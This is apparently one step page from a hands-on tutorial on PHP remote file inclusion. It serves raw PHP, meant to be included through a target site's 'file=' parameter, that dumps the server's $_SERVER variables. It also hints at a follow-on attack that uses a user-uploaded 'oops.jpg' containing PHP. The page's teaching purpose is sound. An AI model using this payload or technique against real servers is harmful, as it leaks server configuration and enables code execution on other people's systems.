<h2>Step 4</h2>

<p>
  Try doing a "View Source" on this file or putting the url in the <code>file=</code> on the target website.
</p>

<?php
echo "<?php\n";
?>

/*
 * This is raw uninterpretted PHP hosted in your browser
 */

echo '<p>Your browser has no idea what PHP is. But PHP <code>include</code> does!</p>';

echo '<p>Let\'s try to exploit this by printing all the server variables!</p>';

echo '<pre>';
print_r($_SERVER);
echo '</pre>';

<?php
  echo "\n ?>";
?>

<h2>Step 4</h2>

<p>Fortunately this only works if the <code>allow_url_include</code> is <code>true</code> in your <code>php.ini</code> and most modern PHP servers have this disabled by default. But what if you allow users to upload images to your own server?</p>

<p>
The image <code>oops.jpg</code> was uploaded to this server by a user and instead of an image it includes PHP.<br>
You know what to do.
